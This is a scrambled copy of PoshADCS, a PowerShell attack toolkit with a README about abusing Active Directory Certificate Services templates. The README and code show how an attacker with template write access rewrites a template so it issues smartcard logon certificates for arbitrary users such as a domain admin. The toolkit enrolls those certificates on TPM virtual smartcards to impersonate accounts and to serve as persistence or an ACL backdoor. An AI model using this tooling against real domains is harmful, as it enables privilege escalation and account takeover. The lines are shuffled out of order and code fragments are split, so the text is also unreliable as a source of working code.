    
        
                    $CA.NTAuthCertificates = $true
                    $value = $value.ToString()
                $value = $entry.Get($_.Key)
                Write-Verbose $stderr
                else 
                if(([Convert]::ToBase64String($cert)) -eq ([Convert]::ToBase64String($refcert)))
                {
                }
            $CACerts = new-object 'Object[]' $CA.cacertificate.Count
            $keyusage = new-object 'Object[]' $t.pkiextendedkeyusage.Count
            $p = New-Object System.Diagnostics.Process
            $p.Start() 
            $p.StartInfo = $pinfo
            $p.WaitForExit()
            $pinfo = New-Object System.Diagnostics.ProcessStartInfo
            $pinfo.Arguments = $VSCArgs
            $pinfo.RedirectStandardError = $true
            $pinfo.RedirectStandardOutput = $true
            $pinfo.UseShellExecute = $false
            $stderr = $p.StandardError.ReadToEnd()
            $stdout = $p.StandardOutput.ReadToEnd()
            $t 
            $t.DCAuthCert = $True
            Set-ADCSTemplate -Name $Name -Properties $Global:ADCSTEMPLATESETTINGS -Force
            catch
            else {
            foreach($refcert in $RefCerts)
            if($stderr)
            try{
            {
            }
        $ACEs = $TemplatesACL 
        $CA 
        $CertificateNameFlag = Convert-ADCSFlag -Attribute mspki-certificate-name-flag -Value $t.'mspki-certificate-name-flag'
        $DeviceID)
        $Filter)
        $Flag
        $Force
        $Global:ADCSTEMPLATESETTINGS = @{}
        $Name)
        $NoSmartcard)
        $Properties.'mspki-private-key-flag' 
        $Properties.GetEnumerator() 
        $Raw
        $RefCerts = new-object 'Object[]' $Ntauthstore.cacertificate.Count
        $STOPERROR = $true
        $VSC = Get-VirtualSmartCard
        $VSC = Get-VirtualSmartCard 
        $Value)
        $entry = $template.GetDirectoryEntry()
        $t 
        $template = Get-ADCSTemplate -Name $Name -Raw
        )
        Param (
        Write-Warning $stderr
        [CmdletBinding()]
        [Hashtable]
        [Parameter(Mandatory = $false)]
        [Parameter(Mandatory = $true)]
        [String]
        [Switch]
        [ValidateNotNullorEmpty()]
        [string]
        else
        else {
        foreach($cert in $CACerts)
        foreach($p in $Properties.GetEnumerator())
        foreach($v in $VSC)
        if($CertificateNameFlag)
        if($EnrollmentFlag)
        if($PrivateKeyFlag)
        if((-not (compare-object $keyusage $RefOidDCAuthTemplate)) -or (-not (Compare-Object $keyusage $RefOidKerbAuthTemplate)))
        if(-not $Global:ADCSTEMPLATESETTINGS)
        {
        }
    $EnterpriseCA
    $IAN = New-Object -ComObject X509Enrollment.CAlternativeName
    $IANs = New-Object -ComObject X509Enrollment.CAlternativeNames
    $IANs.Add($IAN)
    $Properties = @{}
    $Request = New-Object -ComObject X509Enrollment.CX509Enrollment
    $Request.CertificateFriendlyName = $TemplateName
    $Request.Enroll()
    $Request.Request.X509Extensions.Add($SAN)
    $Result 
    $RootCA
    $SAN = New-Object -ComObject X509Enrollment.CX509ExtensionAlternativeNames
    $SAN.InitializeEncode($IANs)
    $STOPERROR = $true
    $TargetUPN = $user.userprincipalname
    $TemplatesACL = $TemplatesACL 
    $TemplatesACL = Get-ADCSTemplateACL
    $acl 
    $p = New-Object System.Diagnostics.Process
    $p.Start() 
    $p.StartInfo = $pinfo
    $p.WaitForExit()
    $pinfo = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.Arguments = $VSCArgs
    $pinfo.RedirectStandardError = $true
    $pinfo.RedirectStandardOutput = $true
    $pinfo.UseShellExecute = $false
    $stderr = $p.StandardError.ReadToEnd()
    $stdout = $p.StandardOutput.ReadToEnd()
    $t 
    )
    Get-wmiobject win32_PnPEntity 
    Param (
    Reset-ADCSTemplate -Name $TemplateName
    Set-ADCSTemplate -Name $TemplateName -Properties $Properties -Force
    [CmdletBinding()]
    else
    else {
    foreach($CA in $EnterpriseCA)
    foreach($t in $Templates)
    if($PSBoundParameters['DeviceID'])
    if($PSBoundParameters['NoSmartcard'])
    if($stderr)
    if($t.pkiextendedkeyusage)
    if(-not $TargetUPN)
    if(-not $VSC)
    {
    }
   and/or other materials provided with the distribution.
   contributors may be used to endorse or promote products derived from
   list of conditions and the following disclaimer.
   this list of conditions and the following disclaimer in the documentation
   this software without specific prior written permission.
 $BasePath)}
 $DomainName
 $Name 
 $VSCName 
 $v.DeviceID
 (get-random -Minimum 1000 -Maximum 9999).ToString()   
 Add-Member -MemberType NoteProperty -Name DCAuthCert -Value $False 
 Add-Member -MemberType NoteProperty -Name Identity -Value (Convert-SidToName $acl.SecurityIdentifier)
 Add-Member -MemberType NoteProperty -Name NTAuthCertificates -Value $false
 Attacking certificate templates
 Based on 2.26 msPKI-Enrollment-Flag Attribute
 Based on 2.27 msPKI-Private-Key-Flag Attribute
 Based on 2.28 msPKI-Certificate-Name-Flag Attribute
 ForEach-Object {
 OR BUSINESS INTERRUPTION) HOWEVER
 Out-Null
 PoshADCS
 Proof of concept
 Virtual smartcards to the rescue
 What is a certificate template
 What's ADCS
 __Certificate Templates:__ stores the configuration for all certifcate templates. A certificate template basically is a blueprint for a certificate request (e.g. for an SMIME certificate). However not all certificate templates in this container are necessarily available for enrollment.
 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1
 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/ec71fd43-61c2-407b-83c9-b52272dec8a1
 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/f6122d87-b999-4b92-bff8-f465e8949667
 {$_.DeviceID -eq $DeviceID}
 {$_.ObjectDN -eq $t.distinguishedname}
![ADCS Container](https://user-images.githubusercontent.com/7213829/66890766-758a6a00-efe7-11e9-845a-4c38616b9e09.PNG)
![CN configuration in a computer template](https://user-images.githubusercontent.com/7213829/66890878-db76f180-efe7-11e9-8639-87ebe0826dba.PNG)
![Creating a virtual smartcard](https://user-images.githubusercontent.com/7213829/66890940-16792500-efe8-11e9-818e-33314b60c72f.PNG)
![POC](https://user-images.githubusercontent.com/7213829/66890953-20028d00-efe8-11e9-94ad-991d4da76d7f.PNG)
![Windows Security](https://user-images.githubusercontent.com/7213829/66891292-07df3d80-efe9-11e9-8f51-d6e36af42b60.png)
"                    Set-DomainObject -Identity $Name -SearchBase (""CN=Certificate Templates,"" "
"                $value = ""CLEAR"""
"                Write-Output ""Virtual smartcard $($v.DeviceID) deleted"""
"                Write-Warning ""An error occurred."""
"                if($p.Value -eq ""CLEAR"")"
"                if($value.gettype().Name -eq ""Int32"")"
"            $CA.cacertificate.CopyTo($CACerts,0)"
"            $CACerts = @(,$CA.cacertificate)"
"            $Global:ADCSTEMPLATESETTINGS = """""
"            $Global:ADCSTEMPLATESETTINGS.Add($_.Key,$value)"
"            $VSCArgs = ""destroy /instance "" "
"            $keyusage = @(,$t.pkiextendedkeyusage)"
"            $pinfo.FileName = ""C:"
"            $t.pkiextendedkeyusage.CopyTo($keyusage,0)"
"            Write-Warning ""No state variable found. Nothing to reset."""
"         if($t.pkiextendedkeyusage.gettype().name -eq ""String"")"
"        $Attribute,"
"        $EnrollmentFlag = Convert-ADCSFlag -Attribute mspki-enrollment-flag -Value $t.""mspki-enrollment-flag"""
"        $Identity,"
"        $IncludeACL,"
"        $NTAuthStore.cacertificate.CopyTo($RefCerts,0)"
"        $Name,"
"        $PrivateKeyFlag = Convert-ADCSFlag -Attribute mspki-private-key-flag -Value $t.""mspki-private-key-flag"""
"        $Properties,"
"        $Properties.Add('pKIDefaultCSPs','1,Microsoft Base Smart Card Crypto Provider')"
"        $Properties.Add('pKIDefaultCSPs','1,Microsoft RSA SChannel Cryptographic Provider')"
"        $RefCerts = @(,$NTAuthStore.cacertificate)"
"        $ResolveFlags,"
"        $TemplateName,"
"        Write-Output ""Pin: 12345678"""
"        Write-Output ""Virtual smartcard $($VSCName) created"""
"        Write-Warning ""An error occurred during VSC generation."""
"        Write-Warning ""User $($Identity) does not have a UPN."""
"        Write-Warning ""Virtual Smartcard not found."""
"        [Parameter(Mandatory = $true, ValueFromPipeline=$true)]"
"        [Parameter(Position = 0, Mandatory = $false, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]"
"        [Parameter(Position = 0, Mandatory = $true)]"
"        [Parameter(Position = 1, Mandatory = $true)]"
"        [Parameter(Position = 2, Mandatory = $false)]"
"        [ValidateSet(""AdminACEs"",""DefaultACEs"")]"
"        [ValidateSet(""mspki-enrollment-flag"",""mspki-certificate-name-flag"",""mspki-private-key-flag"")]"
"        if($CA.cacertificate.gettype().name -eq ""Byte[]"")"
"    ""mspki-certificate-name-flag""{ Convert-ADCSNameFlag -Flag $Value }"
"    ""mspki-enrollment-flag"" { Convert-ADCSEnrollmentFlag -Flag $Value }"
"    ""mspki-private-key-flag""{ Convert-ADCSPrivateKeyFlag -Flag $Value }"
"    $BasePath = ""CN=Public Key Services,CN=Services,CN=Configuration"" "
"    $DomainName = ""DC="" "
"    $EnterpriseCA = Get-DomainObject -SearchBase (""CN=Enrollment Services,"" "
"    $IAN.InitializeFromString(0xB,$TargetUPN)"
"    $NTAuthStore = Get-DomainObject -SearchBase (""CN=NTAuthCertificates,"" "
"    $Properties.Add('flags','CLEAR')"
"    $Properties.Add('msPKI-Certificate-Application-Policy',@('1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.5.7.3.2'))"
"    $Properties.Add('mspki-certificate-name-flag',1)"
"    $Properties.Add('mspki-enrollment-flag',0)"
"    $Properties.Add('mspki-private-key-flag',256)"
"    $Properties.Add('pkidefaultkeyspec',1)"
"    $Properties.Add('pkiextendedkeyusage',@('1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.5.7.3.2'))"
"    $Request.InitializeFromTemplateName(0x1,$TemplateName)"
"    $RootCA =  Get-DomainObject -SearchBase (""CN=Certification Authorities,"" "
"    $VSCArgs = ""create /name "" "
"    $VSCName = ""VSC"" "
"    $pinfo.FileName = ""C:"
"    Write-Verbose ""Changing template $TemplateName into a smartcard template"""
"    Write-Verbose ""Requesting certificate for $($TargetUPN)"""
"    Write-Verbose ""Rolling back changes to template. Nothing happend here..."""
"    Write-Warning ""Global state variable exists. If you go on, you may loose old data. Use -Force to override"""
"    Write-Warning ""Template $($TemplateName) does not exist."""
"    Write-Warning ""User $($Identity) does not exist."""
"    if($NTAuthStore.cacertificate.gettype().name -eq ""Byte[]"")"
" "" /pin default /adminkey random /generate"""
" "")"") -Clear $p.Key"
" "")"") -Set @{$p.Key=$p.Value}"
" "")"") }"
" "","" "
" $BasePath) -LDAPFilter ""(objectclass=certificationAuthority)"""
" $BasePath) -LDAPFilter ""(objectclass=pKIEnrollmentService)"""
" $BasePath) -LDAPFilter (""(objectclass=pKICertificateTemplate)(name="" "
" $Domain.Replace(""."","",DC="")"
" (((Get-Domain).Name).Replace(""."","",DC=""))"
" Add-Member -MemberType NoteProperty -Name ""ACL"" -Value $ACEs"
" Add-Member -MemberType NoteProperty -Name ""CertificateNameFlag"" -Value $CertificateNameFlag"
" Add-Member -MemberType NoteProperty -Name ""EnrollmentFlag"" -Value $EnrollmentFlag"
" Add-Member -MemberType NoteProperty -Name ""PrivateKeyFlag"" -Value $PrivateKeyFlag"
" LOSS OF USE, DATA, OR PROFITS"
" The certificate of the Enterprise CA issuing the smartcard certificate needs to be present under ""CN=NtAuthCertificates, CN=Public Key Services, CN=Services, CN=Configuration, DC=domain, dc=com"". This is done automatically during setup of the CA, so it shouldn't be a problem."
" The domain controller(s) need's a certificate issued from one of the following templates: Domain Controller, Domain Controller Authentication, Kerberos Authentication. This is probably the only crucial requirement that might not be met. However if there is an enterprise CA and auto enrollment enabled, from my experience it is very likely that the domain controllers already got the certificate automatically."
" You obviously need a smartcard. This can be a physical smartcard, however bringing a real smartcard implies the need of physical access, which can be a challenge. Luckily, there's a solution called ""virtual smartcard"". More on that later."
" __Enrollment Services:__ Stores CA's available for certificate enrollment. Windows hosts use this container to automatically find CA's that can issue certificates to them. The respective CA object in this container has a member attribute called ""certificate Templates"". This attribute contains a list of all certificate templates (see above) that are available for enrollment on this CA. This is usually only a subset of all existing templates. "
" __NtAuthCertificates:__ Stores CA's that are permitted to issue smartcard logon certificates. If you try to log on with a smartcard certificate issued by a CA not in this list, authentication will fail. Every Enterprise CA is automatically added here."
" select-object Name, Description, DeviceID"
" { -not (($_.SecurityIdentifier.value -like """
" {$_.ClassGuid -eq ""{50DD5230-BA8A-11D1-BF5D-0000F805F530}""} "
"$BasePath = ""CN=Public Key Services,CN=Services,CN=Configuration"" "
"$BitFlag =  [convert]::ToString($Flag,2).padleft(32,'0')"
"$DomainName = ""DC="" "
"$Properties.Add('flags','CLEAR')"
"$Properties.Add('mspki-certificate-name-flag',1)"
"$RefOidDCAuthTemplate = @(""1.3.6.1.5.5.7.3.2"", ""1.3.6.1.5.5.7.3.1"", ""1.3.6.1.4.1.311.20.2.2"")"
"$RefOidKerbAuthTemplate = @(""1.3.6.1.5.5.7.3.2"", ""1.3.6.1.5.5.7.3.1"", ""1.3.6.1.4.1.311.20.2.2"", ""1.3.6.1.5.2.3.5"")"
"$SearcherArguments = @{""SearchBase""=(""CN=Certificate Templates,"" "
"$SearcherArguments.Add(""LDAPFilter"",""(objectclass=pKICertificateTemplate)"")"
"-498"") -or ($_.SecurityIdentifier.value -eq ""S-1-5-9"") -or ($_.SecurityIdentifier.value -eq ""S-1-5-11"") -or ($_.SecurityIdentifier.value -like """
"-498"") -or ($_.SecurityIdentifier.value -eq ""S-1-5-9"")) }"
"-500"") -or ($_.SecurityIdentifier.value -like """
"-512"") -or ($_.SecurityIdentifier.value -like """
"-513"") -or ($_.SecurityIdentifier.value -like """
"-515"") -or ($_.SecurityIdentifier.value -like """
"-516"") -or ($_.SecurityIdentifier.value -like """
"-519"") -or ($_.SecurityIdentifier.value -like """
"-553"")) } "
"-Filter DefaultACEs --> will remove ACEs that match to default domain groups including admin groups (e.g. Domain Admins, Authenticated Users,...)"
"1. Redistributions of source code must retain the above copyright notice, this"
"2. Redistributions in binary form must reproduce the above copyright notice,"
"= ""CT_FLAG_ADD_OCSP_NOCHECK"""
"= ""CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF"""
"= ""CT_FLAG_ALLOW_PREVIOUS_APPROVAL_KEYBASEDRENEWAL_VALIDATE_REENROLLMENT"""
"= ""CT_FLAG_ATTESTATION_WITHOUT_POLICY"""
"= ""CT_FLAG_ATTEST_NONE"""
"= ""CT_FLAG_ATTEST_PREFERRED"""
"= ""CT_FLAG_ATTEST_REQUIRED"""
"= ""CT_FLAG_AUTO_ENROLLMENT"""
"= ""CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE"""
"= ""CT_FLAG_EK_TRUST_ON_USE"""
"= ""CT_FLAG_EK_VALIDATE_CERT"""
"= ""CT_FLAG_EK_VALIDATE_KEY"""
"= ""CT_FLAG_ENABLE_KEY_REUSE_ON_NT_TOKEN_KEYSET_STORAGE_FULL"""
"= ""CT_FLAG_EXPORTABLE_KEY"""
"= ""CT_FLAG_INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS"""
"= ""CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS"""
"= ""CT_FLAG_ISSUANCE_POLICIES_FROM_REQUEST"""
"= ""CT_FLAG_NOREVOCATIONINFOINISSUEDCERTS"""
"= ""CT_FLAG_PEND_ALL_REQUESTS"""
"= ""CT_FLAG_PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT"""
"= ""CT_FLAG_PUBLISH_TO_DS"""
"= ""CT_FLAG_PUBLISH_TO_KRA_CONTAINER"""
"= ""CT_FLAG_REMOVE_INVALID_CERTIFICATE_FROM_PERSONAL_STORE"""
"= ""CT_FLAG_REQUIRE_ALTERNATE_SIGNATURE_ALGORITHM"""
"= ""CT_FLAG_REQUIRE_PRIVATE_KEY_ARCHIVAL"""
"= ""CT_FLAG_REQUIRE_SAME_KEY_RENEWAL"""
"= ""CT_FLAG_STRONG_KEY_PROTECTION_REQUIRED"""
"= ""CT_FLAG_USER_INTERACTION_REQUIRED"""
"= ""CT_FLAG_USE_LEGACY_PROVIDER"""
"= ""ENROLLEE_SUPPLIES_SUBJECT"""
"= ""ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME"""
"= ""OLD_CERT_SUPPLIES_SUBJECT_AND_ALT_NAME"""
"= ""SUBJECT_ALT_REQUIRE_DIRECTORY_GUID"""
"= ""SUBJECT_ALT_REQUIRE_DNS"""
"= ""SUBJECT_ALT_REQUIRE_DOMAIN_DNS"""
"= ""SUBJECT_ALT_REQUIRE_EMAIL"""
"= ""SUBJECT_ALT_REQUIRE_UPN"""
"= ""SUBJECT_REQUIRE_COMMON_NAME"""
"= ""SUBJECT_REQUIRE_DIRECTORY_PATH"""
"= ""SUBJECT_REQUIRE_DNS_AS_CN"""
"= ""SUBJECT_REQUIRE_EMAIL"""
"AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE"
"Active Directory Service Certificates is a server-role for Windows server that allows you to run a PKI (Public Key Infrastructure) on Windows. Upon installation, you can decide if you want to install a standalone or an enterprise CA. Simply put: a standalone CA is just a certificate authority running on Windows, whereas an enterprise CA integrates with Active Directory."
"Active Directory integrated Certificate Authorities (Enterprise CAs) store a part of their configuration in Active Directory. Espescially of interest are the so called ""Certificate Templates""."
"As mentioned earlier, a certificate template is like a blueprint to populate a certificate request. Here's an example: a certificate template for a ""Computer Certificate"" (e.g. for authentication using 802.1x) contains certain attributes relevant to that usage scenario. This template will typically be configured to use the requesting hosts DNS name as the Common Name in the certificate."
"As you can see in the screenshot above, it is however also possible to allow the enrollment client to submit an arbitrary common name. This poses a certain risk because the CA has to trust the client to provide a correct CN. The CA administrator can limit the acces to a certificate template through the ACL of the template object in Active Directory. The ACL of the template not only defines who can modify the template but also who can enroll a template."
"CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,"
"CN=Public Key Services, CN=Services, CN=Configuration, DC=domain, dc=com"
"Certificate enrollment can either happen automatically (Permission = Auto Enrollment) or manually (Permission = Enroll). Auto enrollment is configured via group policy and enforced throuh the group policy client during processing of the policy. If auto enrollment is enabled, the group policy client will look for and enroll all available certificate templates where the auto enrollment permission is set."
"Converts the mspki-certificate-name-flag specified by the ""Flag"" parameter."
"Converts the mspki-enrollment-flag specified by the ""Flag"" parameter."
"Converts the mspki-private-key-flag specified by the ""Flag"" parameter."
"Copyright (c) 2019, Christoph Falta"
"Creates a virtual smartcard with a default pin and a random name prefixed with ""VSC"""
"DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR"
"Every template is named after its intended cause and this strengthens the idea, that you can only issue computer certificates from a ""computer""-template. However, there is no fundamental difference between two different templates. Every template can issue every kind of certficate, if populated with the right parameters."
"FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL"
"From a sysadmins perspective, certificate templates seem quite different. Every Enterprise CA ships with a couple of default templates and it is common practice that, if you want to use a certain template, you create a copy of one of the default templates and work with that."
"Get's the ACEs of the template with name ""Template1"" and removes all default ACEs"
"Get's the template with the name ""Template1"" and resolves flags."
"Get-SmartCardCertificate will change various attributes in the certificate template defined by the ""TemplateName"" parameter to make it possible to request a smartcard certificate for the user specified by the parameter ""Identity""."
"I tried to show the relevant interconnections in a picture. Though it looks like my little daughter drew it, I hope you get the point "
"If an attacker gains access (Write/Enroll or WriteDACL) to any template, it is possible to reconfigure that template to issue certificates for Smartcard Logon. The attacker can even enroll these certificate for any given user, since the setting that defines the CN of the certificate is controlled in the template."
"If an attacker gains write access (Write and Enroll or WriteDACL) on any of these templates (e.g. through a service account) it is possible to ""rewrite"" any template so the attacker can enroll a smart card certificate for arbitrary users (e.g. domain admin) and then impersonate that user."
"If smartcards are currently not in use in the target environment, the attack will still work as long as the following is true:"
"If you want to give a Windows client a certificate so it can participate in 802.1x, you would use a ""Computer"" template. If you want to issue SMIME certificates to your users, you'll use a copy of the ""User"" template."
"Just a shortcut to PowerViews Get-DomainObject that retrieves Enterprise CAs from the default location at CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration...."
"Just a shortcut to PowerViews Get-DomainObject that retrieves Root CAs from the default location at CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration...."
"Long story short, the attacker can impersonate any user by enrolling a smartcard logon certificate for that user. If the domain already uses smartcards for authentication, all requirements are already met and the attack should work out of the box."
"OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
"Overwrites an existing state variable. Otherwise, the script will not run if a state variable exists to make sure that you don't loose data."
"Redistribution and use in source and binary forms, with or without"
"Since bringing a physical smartcard to a host you might have only remote access to can pose a challenge, there is a solution called virtual smartcard. Virtual smartcards where implemented in Windows 8 and allow you to use a TPM chip to create a virtual smartcard device. "
"Since most modern business clients ship with a TPM chip, this shouldn' be a problem. In fact, virtual smartcards are much more usable for the attack than real smartcards because they work out of the box on Windows clients and servers without the need of any special drivers and they work even over RDP. "
"So what does ""enterprise"" and ""integrated"" mean specifically"
"THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS"""
"The computer requesting the certificate will therefore populate the certificate request in accordance with the settings in the template. The CA too uses the configuration in the template for validation, so even if the client submits a wrong common name, the CA would change it to the one defined in the template before issung the certificate."
"The data is split in different containers like ""AIA"" or ""Certificate Templates"". We'll focus on those relevant to our attack scenario for now."
"The flag attribute to translate. Can be one of ""mspki-enrollment-flag"", ""mspki-certificate-name-flag"" or ""mspki-private-key-flag""."
"The name of the certificate template to search for. If omitted, all templates will be retrieved."
"The script will rewrite the template to allow for smartcard enrollment, get the certificate and then reset the template to its original configuration :-)"
"This function gets a specified or all objects of type ""pKICertificateTemplate"" stored under the default path CN=Certificate Templates... from Active Directory using PowerViews Get-DomainObject."
"Translates the value ""1"" according to microsoft documentation."
"if ($PSBoundParameters['Name']) { $SearcherArguments['LDAPFilter'] = (""(objectclass=pKICertificateTemplate)(name="" "
"if($BitFlag.Substring(0,1) -eq '1')"
"if($BitFlag.Substring(1,1) -eq '1')"
"if($BitFlag.Substring(14,1) -eq '1')"
"if($BitFlag.Substring(15,1) -eq '1')"
"if($BitFlag.Substring(16,1) -eq '1')"
"if($BitFlag.Substring(17,1) -eq '1')"
"if($BitFlag.Substring(18,1) -eq '1')"
"if($BitFlag.Substring(19,1) -eq '1')"
"if($BitFlag.Substring(2,1) -eq '1')"
"if($BitFlag.Substring(20,1) -eq '1')"
"if($BitFlag.Substring(21,1) -eq '1')"
"if($BitFlag.Substring(22,1) -eq '1')"
"if($BitFlag.Substring(23,1) -eq '1')"
"if($BitFlag.Substring(24,1) -eq '1')"
"if($BitFlag.Substring(25,1) -eq '1')"
"if($BitFlag.Substring(26,1) -eq '1')"
"if($BitFlag.Substring(27,1) -eq '1')"
"if($BitFlag.Substring(28,1) -eq '1')"
"if($BitFlag.Substring(29,1) -eq '1')"
"if($BitFlag.Substring(3,1) -eq '1')"
"if($BitFlag.Substring(30,1) -eq '1')"
"if($BitFlag.Substring(31,1) -eq '1')"
"if($BitFlag.Substring(4,1) -eq '1')"
"if($BitFlag.Substring(5,1) -eq '1')"
"if($BitFlag.Substring(6,1) -eq '1')"
"if($BitFlag.Substring(7,1) -eq '1')"
"if($BitFlag.Substring(9,1) -eq '1')"
"if($Filter -eq ""AdminACEs"")"
"if($Filter -eq ""DefaultACEs"")"
"modification, are permitted provided that the following conditions are met:"
"tpmvscmgr.exe"""
$Domain = (Get-Domain).Name    
$Properties = @{}
$Result
$Result = @()
$STOPERROR = $false
$Templates
$Templates = Get-DomainObject @SearcherArguments
$TemplatesACL
$TemplatesACL = Get-DomainObjectACL @SearcherArguments -Resolveguids
$user = Get-DomainObject -Identity $Identity
-----------
-Filter AdminACEs --> will remove ACEs that match to default admin groups (e.g. Domain Admins)
.DESCRIPTION
.EXAMPLE
.LINK
.PARAMETER Attribute
.PARAMETER DeviceID
.PARAMETER Filter
.PARAMETER Flag
.PARAMETER Force
.PARAMETER Identity
.PARAMETER IncludeACL
.PARAMETER Name
.PARAMETER NoSmartcard
.PARAMETER Properties
.PARAMETER ResolveFlags
.PARAMETER TemplateName
.PARAMETER Value
.SYNOPSIS
0000
3. Neither the name of the copyright holder nor the names of its
= 16
A variable of type hashtable containing the attributes you want to change. Have a look at Get-SmartcardCertificate for inspiration.
All rights reserved.
An enterprise CA not only stores its configuration in a local database but also in the configuration partition of Active Directory under the following key:
Author: Christoph Falta (@cfalta)
BSD 3-Clause License
Certificate templates are used by clients als well as by the CA to determine how to populate the fields in a certificate request as well as the resulting certificate. Usually there are a couple of published certificate templates in any organization that uses an AD integrated CA.
Changes to the certificate template will be rolled back automatically at the end of the script.
Convert-ADCSEnrollmentFlag -Flag 1
Convert-ADCSFlag -Attribute mspki-enrollment-flag -Value 1
Convert-ADCSNameFlag -Flag 1
Convert-ADCSPrivateKeyFlag -Flag 1
Converts the value 1 of the attribute mspki-enrollment-flag into a human readable form.
Creating a virtual smartcard is simple as Windows provides a management tool called tpmvscmgr.exe Just run the command below to generate a smartcard with the default pin (12345678).
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
Description
Filter the ACEs to reduce output and gain better visibility.
Get's all templates and resolves flags.
Get's the ACEs of all templates and removes admin ACEs
Get-ADCSTemplate -Name Template1 -ResolveFlags
Get-ADCSTemplate -ResolveFlags
Get-ADCSTemplateACL -Filter AdminACEs
Get-ADCSTemplateACL -Name Template1 -Filter DefaultACEs
Get-ADCSTemplateACL uses PowerViews Get-DomainObjectACL to retrieve the ACLs of a single or all certificate templates. 
Get-SmartCardCertificate allows you to get a Smartcard Certificate from a Windows Enterprise CA for a specified user account by rewriting an arbitrary certificate template that the executing user has write access on. 
Get-SmartcardCertificate -Identity domadm -TemplateName CorpComputer
I wrote a proof of concept script that implements the attack described above. It takes the samaccountname of a domain user to impersonate and the name of a certificate template you have access to.
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
Includes the ACLs of the template in the returned template object.
Instructs the script to translate the flag attributes to human readable values.
Instructs the script to use the default CSP during enrollment. This will result in the certificate being stored in the default user cert store and not on a smartcard.
It can also translate the various flag attributes to human-readable values and include the ACLs of the template objects.
It will then request this certifiate automatically using COM/MS-WCCP protocol and store it in a smartcard that needs to be present on the system executing this script.
New-VirtualSmartcard
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
PoshADCS is the result of my current research in finding attack paths against an Active Dircetory Domain through ADCS (Active Directory Certificate Services). The script is still in a very beta-stage at the moment so use it only if you know what you are doing.
Remove-VirtualSmartcard -DeviceID ROOT
Removes the virtual smartcard with the ID ROOT
Requests a smartcard certificate for the user domadm using the template CorpComputer.
Reset-ADCSTemplate -Name CorpComputer
Reset-ADCSTemplate just calls Set-ADCSTemplate but uses the global environment variable ADCSTEMPLATESETTINGS as input. The variable is cleared after execution.
Resets the attribute values stored in $global:ADCSTEMPLATESETTINGS on the template CorpComputer.
SERVICES
SMARTCARDREADER
Set-ADCSTemplate -Name CorpComputer -Properties $Properties
Simple PowerShell wrapper around tpmvscmgr.exe.
Simple wrapper around Get-WmiObject so you dont have to remember the class guid 
Simple wrapper around tpmvscmgr.exe to remove a VSC by ID.
Simple wrapper around tpmvscmgr.exe to remove a VSC by name.
So you can use the virtual smartcard on a compromised client to log in to a server without TPM just as you would with username/password.
System32
The ID of the virtual smartcard device.
The command above will set the mspki-certificate-name-flag to 1 and clear the flags attribute on the template named CorpComputer
The name of the certificate template to change.
The name of the certificate template to use.
The template to rewrite. Note that the script assumes that you have write permissions on the template.
The user to request a smartcard certificate for.
The value to translate.
Therefore it is very easy to change multiple attributes on a certificate template and automatically reset it after you are done.
This can be used as an ACL-based backdoor as well as an offensive attack vector.
This can be used as method of domain wide privilege escalation (think domain admin) as well as a long-term persistence method. This script heavily relies on PowerView by Will Schroeder.
This function basically is a wrapper around PowerViews Set-Domainobject. The major difference is that it will store the current values of all attributes that should be changed in a global state variable called $global:ADCSTEMPLATESETTINGS.
This function is used to automatically reset a certificate template to the state before Set-ADCSTemplate was called. The script assumes write permissions.
Translates the value of a specified flag-attribute into a human readable form.
Use the filter switch to remove ACEs that match admin groups or other default groups to reduce the output and gain better visibility.
Use this if you have no smartcard or just want a PoC.
Windows
You typically use the standalone CA for your root CA (because in can be offline or disconnected) and the enterprise CA for the issuing CA.
dev/
else {
foreach($acl in $TemplatesACL)
foreach($t in $Templates)
function Convert-ADCSEnrollmentFlag
function Convert-ADCSFlag
function Convert-ADCSNameFlag
function Convert-ADCSPrivateKeyFlag
function Get-ADCSTemplate
function Get-ADCSTemplateACL 
function Get-EnterpriseCA
function Get-RootCA
function Get-SmartcardCertificate{
function Get-VirtualsmartCard
function New-VirtualSmartcard
function Remove-VirtualsmartCard
function Reset-ADCSTemplate
function Set-ADCSTemplate
https://github.com/cfalta/PoshADCS
if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
if($BitFlag -eq '00000000000000000000000000000000')
if($Global:ADCSTEMPLATESETTINGS -and -not $Force)
if($IncludeACL)
if($ResolveFlags)
if(-not $STOPERROR)
if(-not $user)
if(-not (Get-ADCSTemplate -Name $TemplateName))
switch($Attribute)
tpmvscmgr.exe /create /name VSC01 /pin default /adminkey random /generate
